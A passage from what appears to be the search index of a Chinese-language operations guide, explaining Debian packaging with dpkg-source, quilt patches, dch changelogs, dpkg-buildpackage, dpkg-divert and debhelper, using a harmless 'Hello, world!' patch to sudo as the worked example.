archives.\ndpkg-source: info: extracting sudo in sudo-1.9.13p3\ndpkg-source: info: unpacking sudo_1.9.13p3.orig.tar.gz\ndpkg-source: info: unpacking sudo_1.9.13p3-1+deb12u1.debian.tar.xz\ndpkg-source: info: using patch list from debian/patches/series\ndpkg-source: info: applying debian-bug-1039557\ndpkg-source: info: applying paths-in-samples.diff\ndpkg-source: info: applying Whitelist-DPKG_COLORS-environment-variable.diff\ndpkg-source: info: applying sudo-ldap-docs\n</code></pre>"},{"location":"ops/package/#debian-dir","title":"\u4fee\u6539\u200b\u8f6f\u4ef6\u5305\u200b\u6e90\u7801","text":"<p>\u200b\u5f97\u5230\u200b\u7684\u200b\u6e90\u7801\u200b\u4e2d\u200b\u9664\u4e86\u200b\u8f6f\u4ef6\u5305\u200b\u672c\u8eab\u200b\u7684\u200b\u4ee3\u7801\u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b <code>debian</code> \u200b\u76ee\u5f55\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u76ee\u5f55\u200b\u5305\u542b\u200b\u4e86\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u6784\u5efa\u200b\u76f8\u5173\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5305\u62ec\u200b <code>control</code>\u3001<code>changelog</code>\u3001<code>patches/</code> \u200b\u7b49\u7b49\u200b\u3002</p>"},{"location":"ops/package/#quilt","title":"\u4f7f\u7528\u200b quilt \u200b\u7ba1\u7406\u200b\u8865\u4e01","text":"<p>\u200b\u8865\u4e01\u200b\u7b80\u4ecb\u200b</p> <p>\u200b\u8865\u4e01\u200b\u662f\u200b\u540e\u7f00\u200b\u4e3a\u200b <code>patch</code> \u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u7531\u200b <code>diff</code> \u200b\u751f\u6210\u200b\u3002\u200b\u8865\u4e01\u200b\u6709\u200b\u591a\u79cd\u4e0d\u540c\u200b\u7684\u200b\u683c\u5f0f\u200b\uff1aunified diff (<code>diff -u</code>)\u3001context diff (<code>diff -c</code>) \u200b\u548c\u200b normal diff\uff08\u200b\u9ed8\u8ba4\u200b\uff09\u3002\u200b\u5176\u4e2d\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u662f\u200b unified diff \u200b\u683c\u5f0f\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff08\u200b\u547d\u4ee4\u200b\u4e3a\u200b <code>diff -u test.txt test_new.txt</code>\uff09\uff1a</p> <pre><code>--- test.txt    2025-02-07 16:00:16.591987241 +0800\n+++ test_new.txt    2025-02-07 16:00:28.462299382 +0800\n@@ -1 +1 @@\n-Hello, world!\n+Goodbye, world!\n</code></pre> <p>Git \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git diff</code> \u200b\u6765\u200b\u751f\u6210\u200b\u8865\u4e01\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>diff --git a/pytorch/sync.py b/pytorch/sync.py\nindex 577a88f..0e6b4d8 100644\n--- a/pytorch/sync.py\n+++ b/pytorch/sync.py\n@@ -4,7 +4,7 @@ import httpx\nfrom pathlib import Path\nimport os\nimport re\n-from urllib.parse import urlparse, urljoin\n+from urllib.parse import urlparse, urljoin, unquote\nimport asyncio\nimport time\n\n@@ -83,7 +83,7 @@ async def get_with_progress(client: httpx.AsyncClient, url: str):\n\n\nasync def recursive_download(client: httpx.AsyncClient, url: str):\n-    path = urlparse(url).path\n+    path = unquote(urlparse(url).path)\n    while path.startswith(\"/\"):\n        path = path[1:]\n    if url.endswith(\"/\"):\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\u7684\u200b <code>@@ -4,7 +4,7 @@</code> \u200b\u8868\u793a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8865\u4e01\u200b\u5757\u200b\u6d89\u53ca\u200b\u5230\u200b\u65e7\u200b\u6587\u4ef6\u200b\u7b2c\u200b 4 \u200b\u884c\u200b\u5f00\u59cb\u200b\u7684\u200b 7 \u200b\u884c\u200b\u4e0e\u200b\u65b0\u200b\u6587\u4ef6\u200b\u7b2c\u200b 4 \u200b\u884c\u200b\u5f00\u59cb\u200b\u7684\u200b 7 \u200b\u884c\u200b\u4fee\u6539\u200b\uff0c\u200b\u800c\u200b <code>@@</code> \u200b\u540e\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\uff08\u200b\u4f8b\u5982\u200b <code>import httpx</code>\uff09\u200b\u5219\u200b\u662f\u200b\u7528\u6765\u200b\u5e2e\u52a9\u200b\u4eba\u7c7b\u200b\u5b9a\u4f4d\u200b\u4fee\u6539\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u4e0a\u4e0b\u6587\u200b\u7684\u200b\uff0c\u200b\u5bf9\u5e94\u200b <code>diff</code> \u200b\u7684\u200b <code>--show-c-function</code> \u200b\u6216\u8005\u200b <code>--show-function-line=RE</code> \u200b\u53c2\u6570\u200b\uff0c\u200b\u5b9e\u9645\u200b\u81ea\u52a8\u200b\u5e94\u7528\u200b\u8865\u4e01\u200b\u7684\u200b\u65f6\u5019\u200b\u4e0d\u200b\u9700\u8981\u200b\u8fd9\u91cc\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002</p> <p>\u200b\u751f\u6210\u200b\u7684\u200b\u8865\u4e01\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>patch</code> \u200b\u547d\u4ee4\u200b\u5e94\u7528\u200b\u5728\u200b\u672a\u200b\u6253\u8865\u4e01\u200b\u7684\u200b\u6587\u4ef6\u200b\u4e0a\u200b\uff1a</p> <pre><code>$ patch &lt; test.patch\n$ # git diff \u200b\u751f\u6210\u200b\u7684\u200b patch \u200b\u5f00\u5934\u200b\u662f\u200b a/ b/\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b -p1 \u200b\u5265\u79bb\u200b\u8fd9\u200b\u4e00\u5c42\u200b\u524d\u7f00\u200b\n$ # \u200b\u5f53\u7136\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b git apply\n$ patch -p1 &lt; git_diff.patch\n</code></pre> <p>\u200b\u53d1\u884c\u7248\u200b\u6253\u5305\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u9700\u8981\u200b\u5728\u200b\u539f\u59cb\u200b\u4ee3\u7801\u200b\u4e0a\u200b\u505a\u200b\u4e00\u4e9b\u200b\u4fee\u6539\u200b\uff08\u200b\u4f8b\u5982\u200b\u4fee\u590d\u200b bug\uff0c\u200b\u6dfb\u52a0\u200b\u529f\u80fd\u200b\u7b49\u200b\uff09\uff0c\u200b\u800c\u200b\u8865\u4e01\u200b\u7ba1\u7406\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u7701\u6389\u200b\u4e00\u4e9b\u200b\u9ebb\u70e6\u200b\u3002\u200b\u5c3d\u7ba1\u200b\u5bf9\u200b\u7b80\u5355\u200b\u4fee\u6539\u200b\u4ee3\u7801\u200b\u7684\u200b\u9700\u6c42\u200b\u6765\u8bf4\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7ed5\u8fc7\u200b\u8865\u4e01\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u76f4\u63a5\u200b\u7f16\u8f91\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4f1a\u200b\u5728\u200b\u65e5\u540e\u200b\u5347\u7ea7\u200b\u8f6f\u4ef6\u200b\u7248\u672c\u200b\u65f6\u200b\u5e26\u6765\u200b\u9ebb\u70e6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u4f1a\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b\u8865\u4e01\u200b\u7ba1\u7406\u200b\u6709\u5173\u200b\u7684\u200b\u4e3b\u9898\u200b\u3002<code>quilt</code> \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6808\u5f0f\u200b\uff08stack\uff09\u200b\u7684\u200b\u8865\u4e01\u200b\u7ba1\u7406\u5de5\u5177\u200b\u3002\u200b\u9996\u5148\u200b\u914d\u7f6e\u200b <code>~/.quiltrc</code> \u200b\u5982\u4e0b\u200b\uff1a</p> ~/.quiltrc<pre><code>QUILT_PATCHES=debian/patches\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b quilt \u200b\u67e5\u770b\u200b\u5f53\u524d\u76ee\u5f55\u200b\u7684\u200b\u8865\u4e01\u200b\u60c5\u51b5\u200b\uff1a</p> <pre><code>$ quilt series\ndebian-bug-1039557\npaths-in-samples.diff\nWhitelist-DPKG_COLORS-environment-variable.diff\nsudo-ldap-docs\n$ quilt applied\ndebian-bug-1039557\npaths-in-samples.diff\nWhitelist-DPKG_COLORS-environment-variable.diff\nsudo-ldap-docs\n$ quilt unapplied\nFile series fully applied, ends at patch sudo-ldap-docs\n$\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u8865\u4e01\u200b\u90fd\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5e94\u7528\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>quilt pop</code> \u200b\u548c\u200b <code>quilt push</code> \u200b\u53d6\u6d88\u200b/\u200b\u5e94\u7528\u200b\u6700\u5e95\u5c42\u200b\u7684\u200b\u8865\u4e01\u200b\u3002\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5c06\u200b\u6211\u4eec\u200b\u7684\u200b\u4fee\u6539\u200b\u6dfb\u52a0\u200b\u4e3a\u200b\u65b0\u200b\u7684\u200b\u8865\u4e01\u200b\uff0c\u200b\u56e0\u6b64\u200b\uff1a</p> <pre><code>$ quilt new custom-patch.diff\n$ quilt add src/sudo.c  # \u200b\u5c06\u200b\u4fee\u6539\u200b\u524d\u200b\u7684\u200b\u6587\u4ef6\u200b add \u200b\u5230\u200b quilt \u200b\u4e2d\u200b\nFile src/sudo.c added to patch custom-patch.diff\n$ # \u200b\u5982\u679c\u200b\u8bef\u64cd\u4f5c\u200b\u5c06\u200b\u4fee\u6539\u200b\u540e\u200b\u7684\u200b\u6587\u4ef6\u200b add \u200b\u4e86\u200b\uff0cquilt remove \u200b\u5373\u53ef\u200b\u3002\n$ vim src/sudo.c  # \u200b\u968f\u4fbf\u200b\u505a\u200b\u4e00\u4e9b\u200b\u4fee\u6539\u200b\uff0c\u200b\u6bd4\u5982\u200b\u5728\u200b main() \u200b\u6700\u200b\u5f00\u59cb\u200b\u7528\u200b printf() \u200b\u8f93\u51fa\u200b\u4e00\u884c\u200b\u6587\u672c\u200b\n$ quilt refresh  # \u200b\u5237\u65b0\u200b\u8865\u4e01\u200b\nRefreshed patch custom-patch.diff\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u9a8c\u8bc1\u200b\uff1a</p> debian/patches/custom-patch.diff<pre><code>Index: sudo-1.9.13p3/src/sudo.c\n===================================================================\n--- sudo-1.9.13p3.orig/src/sudo.c   2025-02-07 17:37:38.372195671 +0800\n+++ sudo-1.9.13p3/src/sudo.c    2025-02-07 17:37:50.968524513 +0800\n@@ -149,6 +149,7 @@\n     const char * const allowed_prognames[] = { \"sudo\", \"sudoedit\", NULL };\n     sigset_t mask;\n     debug_decl_vars(main, SUDO_DEBUG_MAIN);\n+    printf(\"Hello, world!\\n\");\n\n     /* Only allow \"sudo\" or \"sudoedit\" as the program name. */\n     initprogname2(argc &gt; 0 ? argv[0] : \"sudo\", allowed_prognames);\n</code></pre> <p>\u200b\u5982\u679c\u200b\u662f\u200b\u5df2\u6709\u200b\u7684\u200b <code>.patch</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>quilt import &lt;file&gt;</code> \u200b\u547d\u4ee4\u200b\u5c06\u200b\u5176\u200b\u5bfc\u5165\u5230\u200b\u8865\u4e01\u200b\u6808\u4e2d\u200b\u3002</p>"},{"location":"ops/package/#changelog","title":"\u66f4\u65b0\u200b\u4fee\u6539\u200b\u8bb0\u5f55","text":"<p><code>debian/changelog</code> \u200b\u6587\u4ef6\u200b\u5305\u542b\u200b\u4e86\u200b\u5305\u200b\u5b8c\u6574\u200b\u7684\u200b\u4fee\u6539\u200b\u8bb0\u5f55\u200b\uff0c\u200b\u683c\u5f0f\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>sudo (1.9.13p3-1+deb12u1) bookworm; urgency=medium\n\n  * add upstream patch to fix event log format.\n    Thanks to Kimmo Suominen (Closes: #1039557)\n\n -- Marc Haber &lt;mh+debian-packages@zugschlus.de&gt;  Tue, 27 Jun 2023 13:45:00 +0200\n</code></pre> <p>\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b <code>dch</code> (<code>debchange</code>) \u200b\u547d\u4ee4\u200b\u6765\u200b\u66f4\u65b0\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7248\u672c\u53f7\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6253\u5f00\u200b\u7f16\u8f91\u5668\u200b\u4ee5\u200b\u7f16\u8f91\u200b\u4fee\u6539\u200b\u8bb0\u5f55\u200b\uff1a</p> <pre><code>EMAIL=youremail@example.com dch -i\n</code></pre> <p>\u200b\u7f16\u8f91\u200b\u7ed3\u679c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>sudo (1.9.13p3-1+deb12u1.1) UNRELEASED; urgency=medium\n\n  * Non-maintainer upload.\n  * Add \"Hello, world!\\n\" in main().\n  * Test with very simple packaging.\n\n -- yourname &lt;youremail@example.com&gt;  Fri, 07 Feb 2025 17:48:19 +0800\n</code></pre>"},{"location":"ops/package/#build","title":"\u6784\u5efa\u200b\u8f6f\u4ef6\u5305","text":"<p>\u200b\u5728\u200b\u6784\u5efa\u200b\u4e4b\u524d\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u786e\u4fdd\u200b\u6784\u5efa\u200b\u9700\u8981\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\uff1a</p> <pre><code>sudo apt build-dep sudo\n# \u200b\u6216\u8005\u200b sudo apt build-dep .\n# \u200b\u5982\u679c\u200b\u5f53\u524d\u76ee\u5f55\u200b\u662f\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u6e90\u4ee3\u7801\u200b\u76ee\u5f55\u200b\uff08\u200b\u4e0b\u200b\u4e00\u7ea7\u200b\u6709\u200b debian/ \u200b\u76ee\u5f55\u200b\uff09\n</code></pre> <p>\u200b\u4ece\u200b\u6e90\u4ee3\u7801\u200b\u76ee\u5f55\u200b\u6784\u5efa\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u547d\u4ee4\u200b\u4e3a\u200b <code>dpkg-buildpackage</code>\uff0c\u200b\u6267\u884c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code>dpkg-buildpackage -b -uc -us\n</code></pre> <p><code>-b</code> \u200b\u4ee3\u8868\u200b\u6784\u5efa\u200b\u4e8c\u8fdb\u5236\u200b\u5305\u200b\uff0c\u200b\u800c\u200b\u7531\u4e8e\u200b\u6211\u4eec\u200b\u5f88\u200b\u660e\u663e\u200b\u6ca1\u6cd5\u200b\u7b7e\u540d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b <code>-uc</code> \u200b\u548c\u200b <code>-us</code> \u200b\u9009\u9879\u200b\u6765\u200b\u8df3\u200b\u8fc7\u200b\u5bf9\u200b\u53d8\u66f4\u200b\uff08changes\uff09\u200b\u4e0e\u200b\u6e90\u4ee3\u7801\u200b\u5305\u200b\uff08source package\uff09\u200b\u7684\u200b\u7b7e\u540d\u200b\u3002\u200b\u6784\u5efa\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e0a\u200b\u4e00\u7ea7\u200b\u76ee\u5f55\u200b\u627e\u5230\u200b <code>1.9.13p3-1+deb12u1.1</code> \u200b\u8fd9\u4e2a\u200b\u7248\u672c\u200b\u7684\u200b <code>sudo</code> \u200b\u7684\u200b deb \u200b\u5305\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5176\u200b\u8c03\u8bd5\u200b\u7b26\u53f7\u200b\u5305\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u8bd5\u8bd5\u200b\u5b89\u88c5\u200b\u4e00\u4e0b\u200b\uff1a</p> <pre><code>$ sudo apt install ./sudo_1.9.13p3-1+deb12u1.1_amd64.deb\n$ sudo uname\nHello, world!\nLinux\n</code></pre> <p>\u200b\u8bd5\u5b8c\u200b\u8bb0\u5f97\u200b\u88c5\u56de\u200b\u6b63\u5e38\u200b\u7684\u200b\u7248\u672c\u200b\u54e6\u200b\uff01\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4fdd\u6301\u200b\u81ea\u5df1\u200b\u4fee\u6539\u200b\u540e\u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u53ef\u200b\u53c2\u8003\u200b\u524d\u200b\u6587\u200b\u63cf\u8ff0\u200b\u7684\u200b\u56fa\u5b9a\u200b\u5305\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6216\u200bAPT \u200b\u4f18\u5148\u7ea7\u200b\u673a\u5236\u200b\u3002</p> <pre><code>$ apt-cache policy sudo\nsudo:\n  Installed: 1.9.13p3-1+deb12u1.1\n  Candidate: 1.9.13p3-1+deb12u1.1\n  Version table:\n *** 1.9.13p3-1+deb12u1.1 100\n        100 /var/lib/dpkg/status\n     1.9.13p3-1+deb12u1 990\n        990 http://mirrors.ustc.edu.cn/debian bookworm/main amd64 Packages\n$ sudo apt install sudo=1.9.13p3-1+deb12u1\nHello, world!\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n$ sudo uname\nLinux\n</code></pre>"},{"location":"ops/package/#packaging","title":"\u7b80\u6613\u200b\u8f6f\u4ef6\u5305\u200b\u6253\u5305","text":"<p>\u200b\u4ee5\u4e0a\u200b\u4ecb\u7ecd\u200b\u4e86\u200b\u4ece\u200b\u5b98\u65b9\u200b\u6e90\u4ee3\u7801\u200b\u5305\u4e2d\u200b\u6253\u5305\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u6709\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u7684\u200b\u9700\u6c42\u200b\u662f\u200b\u4ece\u96f6\u5f00\u59cb\u200b\u6253\u5305\u200b\u4e00\u4e2a\u200b\u8f6f\u4ef6\u5305\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u63d0\u4f9b\u200b\u4e00\u4e9b\u200b\u7b80\u5355\u200b\u7684\u200b\u4f8b\u5b50\u200b\u3002</p>"},{"location":"ops/package/#config-package","title":"\u914d\u7f6e\u200b\u7c7b\u200b\u8f6f\u4ef6\u5305","text":"<p>USTC-vlab/deb \u200b\u662f\u200b Vlab \u200b\u9879\u76ee\u200b\u4e3a\u200b\u5b66\u751f\u200b\u865a\u62df\u673a\u200b\uff08\u200b\u5bb9\u5668\u200b\uff09\u200b\u63d0\u4f9b\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u8865\u5145\u200b\u5305\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u5305\u5747\u200b\u4e3a\u200b\u7b80\u5355\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e0e\u200b\u811a\u672c\u200b\u3002</p> <p>\u200b\u8fd9\u200b\u4e00\u7c7b\u200b\u4e0d\u200b\u9700\u8981\u200b\u7f16\u8bd1\u200b\u64cd\u4f5c\u200b\u7684\u200b\u5305\u200b\u76ee\u5f55\u200b\u6811\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff0c<code>DEBIAN</code> \u200b\u76ee\u5f55\u200b\u5305\u542b\u200b\u4e86\u200b\u6253\u5305\u200b\u540e\u200b <code>control.tar.xz</code> \u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u5185\u5bb9\u200b\u5219\u200b\u7ec4\u6210\u200b\u4e86\u200b <code>data.tar.xz</code>\uff1a</p> <pre><code>.\n\u251c\u2500\u2500 DEBIAN\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 control\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 postinst\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 preinst\n\u2514\u2500\u2500 etc\n    \u251c\u2500\u2500 lightdm\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 lightdm.conf\n    \u2514\u2500\u2500 vlab\n        \u251c\u2500\u2500 greeter-setup.sh\n        \u2514\u2500\u2500 vncserver-lightdm\n</code></pre> <p><code>dpkg-deb --build -Z &lt;dir&gt; &lt;output_dir&gt;</code> \u200b\u53ef\u4ee5\u200b\u5c06\u200b <code>&lt;dir&gt;</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b\u5185\u5bb9\u200b\u6253\u5305\u200b\u4e3a\u200b deb \u200b\u5305\u200b\uff0c\u200b\u5b58\u50a8\u200b\u5230\u200b <code>&lt;output_dir&gt;</code> \u200b\u76ee\u5f55\u200b\u4e2d\u200b\uff08<code>-Z</code> \u200b\u538b\u7f29\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b xz\uff09\u3002</p> <p>\u200b\u7279\u522b\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u8fd9\u200b\u4e00\u7c7b\u200b\u8f6f\u4ef6\u5305\u200b\u9700\u8981\u200b\u8986\u76d6\u200b\u5176\u4ed6\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>dpkg-divert</code> \u200b\u547d\u4ee4\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c<code>vlab-vnc</code> \u200b\u5305\u200b\u9700\u8981\u200b\u8986\u76d6\u200b <code>lightdm</code> \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b <code>/etc/lightdm/lightdm.conf</code>\uff0c\u200b\u56e0\u6b64\u200b\u5176\u200b\u5728\u200b <code>preinst</code> \u200b\u4e2d\u200b\u4f7f\u7528\u200b\u4e86\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>dpkg-divert --package vlab-vnc --divert /etc/lightdm/lightdm.conf.dpkg-divert --add /etc/lightdm/lightdm.conf\n</code></pre> <p>\u200b\u518d\u200b\u4f8b\u5982\u200b\uff0c\u200b\u8be5\u200b\u4ed3\u5e93\u200b\u4e2d\u200b\u4fee\u6539\u200b\u540e\u200b\u7684\u200b <code>firefox</code> \u200b\u9700\u8981\u200b\u79fb\u9664\u200b/\u200b\u91cd\u547d\u540d\u200b <code>/usr/share/mate/applications/firefox.desktop</code>\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b <code>preinst</code> \u200b\u4e2d\u200b\u4f7f\u7528\u200b\u4e86\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>MATE_DESKTOP=/usr/share/mate/applications/firefox.desktop\ndpkg-divert --rename --divert \"$MATE_DESKTOP\".dpkg-divert \"$MATE_DESKTOP\"\n</code></pre> <p>\u200b\u540c\u65f6\u200b\uff0chook \u200b\u811a\u672c\u200b\u5728\u200b\u6267\u884c\u200b\u65f6\u200b\u7684\u200b <code>argv[1]</code> \u200b\u4e3a\u200b\u7528\u6237\u200b\u6267\u884c\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff08\u200b\u4f8b\u5982\u200b <code>install</code>, <code>upgrade</code> \u200b\u7b49\u200b\uff09\uff0c\u200b\u56e0\u6b64\u200b\u811a\u672c\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u64cd\u4f5c\u200b\u6267\u884c\u200b\u4e0d\u540c\u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>case \"$1\" in\n    install)\n        # do something\n        ;;\n    upgrade|abort-upgrade)\n        # do something\n        ;;\n    *)\n        echo \"postinst called with unknown argument \\`$1'\" &gt;&amp;2\n        exit 0\n        ;;\nesac\n</code></pre>"},{"location":"ops/package/#debhelper","title":"\u57fa\u4e8e\u200b debhelper \u200b\u7684\u200b\u6253\u5305\u200b\u7b80\u4ecb","text":"<p>\u200b\u5728\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\u7684\u200b\u6253\u5305\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5728\u200b\u6253\u5305\u200b\u65f6\u200b\u7f16\u8bd1\u7a0b\u5e8f\u200b\u7b49\u200b\u3002\u200b\u76f8\u5173\u200b\u7684\u200b\u64cd\u4f5c\u200b\u7531\u200b <code>debian/rules</code> \u200b\u6587\u4ef6\u200b\u63a7\u5236\u200b\u3002\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b Makefile \u200b\u6587\u4ef6\u200b\u3002\u200b\u7531\u4e8e\u200b\u6b63\u89c4\u200b\u7684\u200b\u6253\u5305\u200b\u6d41\u7a0b\u200b\u975e\u5e38\u590d\u6742\u200b\uff0c\u200b\u624b\u5199\u200b <code>rules</code> \u200b\u6587\u4ef6\u200b\u662f\u200b\u975e\u5e38\u200b\u9ebb\u70e6\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b Debian \u200b\u63d0\u4f9b\u200b\u4e86\u200b debhelper (<code>dh</code>) \u200b\u5de5\u5177\u200b\u6765\u200b\u7b80\u5316\u200b\u6253\u5305\u200b\u6d41\u7a0b\u200b\u3002\u200b\u8981\u200b\u8c03\u7528\u200b <code>dh</code>\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u5728\u200b <code>rules</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\uff1a</p> <pre><code>#!/usr/bin/make -f\n#export DH_VERBOSE=1\n\n%:\n    dh $@\n</code></pre> <p><code>%:</code></p> <p>\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b Makefile \u200b\u7684\u200b\u901a\u914d\u7b26\u200b\u89c4\u5219\u200b\uff0c\u200b\u8868\u793a\u200b\u6240\u6709\u200b\u7684\u200b\u76ee\u6807\u200b\u90fd\u200b\u4f7f\u7528\u200b <code>dh</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u5904\u7406\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u6267\u884c\u200b <code>debian/rules build</code> \u200b\u65f6\u200b\uff0cMakefile \u200b\u4f1a\u200b\u5c06\u200b <code>build</code> \u200b\u4f5c\u4e3a\u200b\u76ee\u6807\u200b\u4f20\u9012\u200b\u7ed9\u200b <code>dh</code>\uff0c\u200b\u56e0\u6b64\u200b\u7b49\u4ef7\u200b\u4e8e\u200b\u6267\u884c\u200b <code>dh build</code>\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>DH_NO_ACT=1</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\u6765\u200b\u67e5\u770b\u200b <code>dh</code> \u200b\u4f1a\u200b\u6267\u884c\u200b\u54ea\u4e9b\u200b\u64cd\u4f5c\u200b\uff1a</p> <pre><code>$ DH_NO_ACT=1 debian/rules clean\ndh clean\n   dh_testdir\n   debian/rules override_dh_auto_clean\n   dh_autoreconf_clean\n   dh_clean\n$ # \u200b\u6216\u8005\u200b\u4f7f\u7528\u200b dh --no-act \u200b\u547d\u4ee4\u200b\n$ # \u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u9605\u8bfb\u200b `debian/rules` \u200b\u786e\u8ba4\u200b dh \u200b\u662f\u200b\u600e\u4e48\u200b\u88ab\u200b\u8c03\u7528\u200b\u7684\u200b\n</code></pre> <p><code>dh</code> \u200b\u7684\u200b\u5404\u9879\u200b\u64cd\u4f5c\u200b\u7ec6\u8282\u200b\u90fd\u200b\u6709\u200b\u5176\u200b\u5bf9\u5e94\u200b\u7684\u200b <code>man</code> \u200b\u6587\u6863\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u8986\u76d6\u200b\u67d0\u4e2a\u200b <code>dh</code> \u200b\u7684\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>debian/rules</code> \u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u5bf9\u5e94\u200b\u7684\u200b\u89c4\u5219\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code># 